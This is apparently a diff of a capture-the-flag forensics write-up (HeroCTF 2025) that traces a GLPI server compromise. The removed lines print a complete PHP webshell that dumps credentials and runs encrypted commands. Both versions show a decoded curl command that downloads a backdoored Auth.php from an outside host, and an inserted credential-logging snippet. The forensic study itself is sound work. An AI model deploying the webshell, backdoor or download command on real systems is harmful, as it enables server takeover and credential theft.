@@ -1,174 +1,86 @@
 ---
 author: NmToan
-date:: 2025-12-28T04:59:04.866Z
-lastmod: 2025-12-28T13:39:20.763Z
+date: 2025-12-28T04:59:04.866Z
+lastmod: 2026-04-27T00:00:00.000Z
 title: HeroCTF 2025 Forensics 2
-slug:  HeroCTF 2025 Forensics 2
+slug: HeroCTF-2025-Forensics-2
 featured: true
 draft: false
 tags:
   - Forensics
   - HeroCTF2025
-description: |
-  "Write-up challenge Forensics 2 từ cuộc thi HeroCTF 2025 về việc điều tra server pensive.hogwarts.local để tìm cách attacker chiếm tài khoản của Albus Dumbledore."
+description: Write-up for HeroCTF 2025 Forensics 2 on investigating `pensive.hogwarts.local` to find how Albus Dumbledore's account was compromised.
 ---
-> **Chủ đề:** Điều tra server pensive.hogwarts.local để tìm cách attacker chiếm tài khoản của Albus Dumbledore  
-> **Mục tiêu:** Trả flag theo format:  
-> `Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}
 
----
-#  Mô tả thử thách
- The director of Hogwarts got his account compromised. The last time he logged on legitimately was from 192.168.56.230 (pensive.hogwarts.local). Investigate to identify how his account got compromised from this server. Please find the following information to go forward in this case: - Absolute path of the file which led to the compromise. - Absolute path of the file used by the attacker to retrieve Albus' account. - The second file stores two pieces of information. The 3rd flag part is the value of the second field of the second piece of information. The findings have to be separated by a ";". 
+> **Topic:** Investigating `pensive.hogwarts.local` to determine how the attacker compromised Albus Dumbledore's account  
+> **Goal:** Return the flag in the format  
+> `Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}`
 
-# Phân tích tổng quan
-  Sau khi extract ta được 2 thư mục chính là:
-  * `/var/log`
-  * `/var/www/glpi`
- 
-  Từ thử thách trước là bài Forensics 01  có được thông tin IP Address của attacker là 192.168.56.200 nên tôi đã bắt đầu với việc tìm kiếm chuỗi IP này trong các log và đã  tìm thấy dấu hiệu đáng ngờ đầu tiên trong file `var/www/glpi/ajax/fileupload.php` thông qua dòng log dưới đây:
-  ```
- 192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 742 "-" "python-requests/2.32.5"
-  ```
-  Có thể thấy attacker đã upload file `setup.php` lên server thông qua file `fileupload.php`. Tiếp tục phân tích file `setup.php` để tìm hiểu chức năng của nó.
-# Phân tích file setup.php  
-Sau khi tìm kiếm tôi đã tìm thấy file `setup.php` trong thư mục `var/www/glpi/files/_tmp/` với nội dung như sau:
-```php
-<?php
+## Challenge Description
 
-/****************************************************************
- * Webshell Usage:
- *   ?passwd=P@ssw0rd123 --> Print glpi passwords in use
- *   ?passwd=P@ssw0rd123&_hidden_cmd=whoami --> Execute whoami
- *
- * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
- *
- * ```bash
- * python3 -c 'import zlib;import base64; shell = open("shell.php", "rb");print(base64.b64encode(zlib.compress(shell.read())));shell.close()'
- * ```
- ****************************************************************/
+The challenge states that the Hogwarts director's account was compromised. The last legitimate login came from `192.168.56.230` on `pensive.hogwarts.local`. The task is to investigate that server and identify:
 
-error_reporting(E_ERROR | E_PARSE);
+1. the absolute path of the file that led to the compromise,
+2. the absolute path of the file used by the attacker to retrieve Albus's account,
+3. the second field of the second record stored in the second file.
 
-$SECURITY_STRATEGY = "no_check";
+The three findings must be joined with `;`.
 
-function title($m){
-  echo "<b><u>" . htmlentities(ucfirst($m)) . "</b></u></br>\n";
-}
+## High-Level Approach
 
-function decrypt_pass($pass){
-  if(method_exists("GLPIKey", "decrypt")){
-    return (new GLPIKey())->decrypt($pass);
-  } elseif(method_exists("Toolbox", "decrypt")){
-    if(method_exists("Toolbox", "sodiumDecrypt")){
-      return Toolbox::sodiumDecrypt($pass);
-    }
-    ### Really old glpi decrypted with a key in the config
-    return Toolbox::decrypt($pass, GLPIKEY);
-  } else {
-    return "<ENCRYPTED>[{$pass}]";
-  }
-}
+After extracting the provided data, I ended up with two main directories:
 
-function dump_password(){
-  global $CFG_GLPI, $DB;
+- `/var/log`
+- `/var/www/glpi`
 
-  ### Show password informations
-  # Dump Proxy scheme
-  # Dump LDAP Password
-  if(!empty($CFG_GLPI["proxy_name"]))
-  {
-    $proxy_credz = !empty($CFG_GLPI["proxy_user"])?$CFG_GLPI["proxy_user"] . ":" . decrypt_pass($CFG_GLPI["proxy_passwd"]) . "@":"";
-    $proxy_url = "http://{$proxy_credz}" . $CFG_GLPI['proxy_name'] . ":" . $CFG_GLPI['proxy_port'];
-    title("proxy:");
-    Html::printCleanArray(array("Proxy In Use" => $proxy_url));
-  }
-  $auth_methods = Auth::getLoginAuthMethods();
+From the previous challenge, Forensics 1, I already knew the attacker's IP address was `192.168.56.200`. So the first step was to search the logs for that IP. The first strong lead appeared in a log entry related to `var/www/glpi/ajax/fileupload.php`:
 
-  $config_ldap = new AuthLDAP();
-  $all_connections = $config_ldap->find();
-
-  foreach($all_connections as $connection){
-    if(isset($connection['rootdn_passwd']) && isset($connection['rootdn'])){
-      $ldap_pass = decrypt_pass($connection['rootdn_passwd']);
-      title("Ldap Connexion:");
-      Html::printCleanArray(array("LDAP Base" => $connection['rootdn'], "LDAP DN" => $connection["basedn"], "LDAP Password" => $ldap_pass, "Connection is active" => $connection['is_active']));
-      }
-    }
-
-  # Dump DB password
-  if(!is_null($DB)){
-    title("Database informations:");
-    Html::printCleanArray(array("DB Host" => $DB->dbhost,
-                                "DB Database" => $DB->dbdefault,
-                                "DB User" => $DB->dbuser,
-                                "DB Password" => urldecode($DB->dbpassword)));
-  }
-}
-
-if(isset($_GET["submit_form"]) && $_GET["submit_form"] === "2b01d9d592da55cca64dd7804bc295e6e03b5df4")
-{
-  for ($i=0; $i < 4; $i++) {
-    $relative = str_repeat("../", $i);
-
-    $to_include = "{$relative}inc/includes.php";
-
-
-    if(file_exists($to_include)){
-      include_once($to_include);
-      try{
-        Html::header("GLPI Password");
-
-        $key = "14ac4b90bd3f880e741a85b0c6254d1f";
-        $iv  = "5cf025270d8f74c9";
-
-        if(isset($_GET["save_result"]) && !empty($_GET["save_result"]))
-        {
-          $output=null;
-          $retval=null;
-
-          $encrypted = base64_decode($_GET['save_result']);
-          $decrypted = openssl_decrypt($encrypted, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);
-
-          exec($decrypted, $output, $retval);
-
-          echo "<code>";
-          foreach ($output as $line) {
-            echo htmlentities($line) . "</br>";
-          }
-          echo "</code></br>";
-        } else {
-          dump_password();
-        }
-      } catch(Exception $e) {
-        echo $e->getMessage();
-      }
-      break;
-    }
-  }
-}
-?>
+```text
+192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 742 "-" "python-requests/2.32.5"
 ```
-  File `setup.php` là một webshell cho phép attacker thực thi lệnh trên server thông qua tham số `save_result` sau khi đã mã hóa AES-256-CBC với key và IV được hardcode trong file.
-# Tìm kiếm dấu vết attacker trong log
-  Quay trở lại với log, ta tiếp tục lọc các log có chứa chuỗi `save_result` để tìm các request liên quan đến việc thực thi lệnh thông qua webshell `setup.php`. Sử dụng lệnh strings | grep:
-  ```bash
-  strings glpi_ssl_access.log | grep 'save_result'
-  ```
-  Ta thu được các dòng log như sau (tôi đã lọc các log có chứa giá trị sau tham số `save_result`):
-  ```
+
+This indicates that the attacker uploaded a file called `setup.php` through GLPI's upload mechanism. That becomes the first file worth investigating.
+
+## 1. Analyze `setup.php`
+
+Searching the extracted filesystem revealed:
+
+- `/var/www/glpi/files/_tmp/setup.php`
+
+The file is a GLPI-specific webshell. Its most important behavior is the handling of the `save_result` parameter: the attacker can send an AES-256-CBC encrypted string, the server decrypts it, and then executes it with `exec()`.
+
+In practice, `setup.php` gives the attacker the ability to:
+
+1. dump sensitive GLPI data such as LDAP and database credentials,
+2. execute commands remotely through HTTP requests,
+3. hide the commands by encrypting them with a hardcoded key and IV.
+
+So the first file that led to the compromise is this webshell.
+
+## 2. Recover the Commands Run Through the Webshell
+
+After identifying the webshell, I went back to the logs and searched for requests containing `save_result`:
+
+```bash
+strings glpi_ssl_access.log | grep 'save_result'
+```
+
+That produced entries such as:
+
+```text
 192.168.56.1 - - [22/Nov/2025:23:09:36 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" 200 12649 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
-192.168.56.1 - - [22/Nov/2025:23:09:55 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" 200 12645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
 192.168.56.1 - - [22/Nov/2025:23:10:02 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= HTTP/1.1" 200 28264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
-192.168.56.1 - - [22/Nov/2025:23:10:51 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== HTTP/1.1" 200 28168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"                                   
-  ```
-Từ các tham số save_result ta có thể giải mã được các lệnh attacker đã thực thi trên server. Sử dụng đoạn script Python sau để giải mã:
+192.168.56.1 - - [22/Nov/2025:23:10:51 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== HTTP/1.1" 200 28168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
+```
+
+Using the hardcoded AES key and IV from `setup.php`, I decoded the payloads with Python:
+
 ```python
 import base64
 from Crypto.Cipher import AES
 
-# Key và IV lấy trực tiếp từ webshell PHP
-key = b"14ac4b90bd3f880e741a85b0c6254d1f"   # 32 bytes
-iv  = b"5cf025270d8f74c9"                  # 16 bytes
+key = b"14ac4b90bd3f880e741a85b0c6254d1f"
+iv  = b"5cf025270d8f74c9"
 
 samples = [
     "oGAHt/Kk1OKeXWxy7iXUfw==",
@@ -180,35 +92,29 @@ for s in samples:
     encrypted = base64.b64decode(s)
     cipher = AES.new(key, AES.MODE_CBC, iv)
     decrypted = cipher.decrypt(encrypted)
-
-    # Strip padding + null bytes giống exec() PHP
     decrypted = decrypted.rstrip(b"\x00").rstrip()
-
     print("Encoded :", s)
     print("Decoded :", decrypted.decode(errors="ignore"))
     print("-" * 40)
 ```
-Kết quả giải mã các lệnh thực thi:
+
+The important decoded commands were:
+
+```text
+curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
+whoami
 ```
-Encoded : oGAHt/Kk1OKeXWxy7iXUfw==
-Decoded :
-#UXP)fq
-----------------------------------------
-Encoded : 4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=
-Decoded : curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
-----------------------------------------
-Encoded : 86AyGErKuj5UoZE9eHtlIg==
-4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=
-Decoded : curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
-----------------------------------------
-Encoded : 86AyGErKuj5UoZE9eHtlIg==
-Decoded : whoami
-```
-  Từ kết quả trên ta thấy attacker đã sử dụng lệnh `curl` để tải một backdoor từ `https://xthaz.fr/glpi_auth_backdoored.php` và ghi đè vào file `Auth.php` trong thư mục `var/www/glpi/src/`. 
-# Phân tích file Auth.php
- Vì file `Auth.php` khá dài nên tôi sẽ để link để các bạn có thể tải và nghiên cứu thêm:
-  [glpi_auth_backdoored.php](https://raw.githubusercontent.com/xthaz/HeroCTF-2025/main/Forensics/For2HeroCTF/glpi_auth_backdoored.php)
-  Qua phân tích file `Auth.php` ta thấy đây là một backdoor nằm trong luồng đăng nhập hợp pháp, cụ thể ngay trước khi gọi LDAP authentication:
+
+The first command shows that the attacker downloaded a backdoored file and overwrote:
+
+- `/var/www/glpi/src/Auth.php`
+
+This is the second key file in the attack chain.
+
+## 3. Analyze the Backdoored `Auth.php`
+
+The modified `Auth.php` sits directly inside the legitimate GLPI login flow. The most important inserted logic appears right before LDAP authentication:
+
 ```php
 $data = json_encode([
    'login' => $login_name,
@@ -221,15 +127,27 @@ $encoded = base64_encode($encrypted) . ";";
 $file = "/var/www/glpi/pics/screenshots/example.gif";
 file_put_contents($file, $encoded, FILE_APPEND);
 ```
-  Backdoor này sẽ lấy thông tin đăng nhập (username và password) của người dùng và mã hóa bằng AES-256-CBC với key và IV được hardcode trong file, sau đó lưu trữ chuỗi đã mã hóa vào file `/var/www/glpi/pics/screenshots/example.gif`.
-Tiếp tục phân tích file `example.gif` để lấy thông tin đăng nhập của Albus Dumbledore.
-Sau khi sử dụng lệnh file ta thấy file `example.gif` không phải là file ảnh thực sự mà chỉ là một file text chứa chuỗi đã mã hóa:
-```
-example.gif:                 ASCII text, with no line terminators
-cat example.gif 
+
+This backdoor:
+
+1. captures user login credentials,
+2. encrypts them with AES-256-CBC,
+3. appends the encrypted output to:
+
+- `/var/www/glpi/pics/screenshots/example.gif`
+
+So the file used to store the stolen credentials is `example.gif`.
+
+## 4. Extract the Credentials from `example.gif`
+
+Checking the file showed that it is not actually an image. It is plain text containing base64 strings:
+
+```text
 mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
 ```
-Dựa vào file `Auth.php` tôi đã trích xuất key và sử dụng đoạn mã python sau để decode ra kết quả:
+
+Using the key and IV embedded in `Auth.php`, I decoded the records:
+
 ```python
 import base64
 from Crypto.Cipher import AES
@@ -259,8 +177,10 @@ for i, p in enumerate(payloads, 1):
     print(decrypted.decode("utf-8"))
     print("-" * 40)
 ```
-Kết quả decode: 
-```
+
+Decoded result:
+
+```text
 [Record 1]
 {"login":"Flag","password":"Hero{FakeFlag:(}"}
 ----------------------------------------
@@ -268,8 +188,23 @@ Kết quả decode:
 {"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
 ----------------------------------------
 ```
-# Kết luận
- FLAG: 
- ```
- Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
+
+The first record is a decoy. The second record contains Albus Dumbledore's real credentials, and the third part of the flag is the second field of the second record:
+
+- `FawkesPhoenix#9!`
+
+## Conclusion
+
+The full attack chain is:
+
+1. the attacker uploads `setup.php`,
+2. the webshell is used to download and overwrite `Auth.php`,
+3. the backdoored `Auth.php` logs victim credentials,
+4. the captured credentials are written into `example.gif`,
+5. decoding `example.gif` reveals Albus Dumbledore's password.
+
+Final flag:
+
+```text
+Hero{/var/www/glpi/files/_tmp/setup.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
 ```
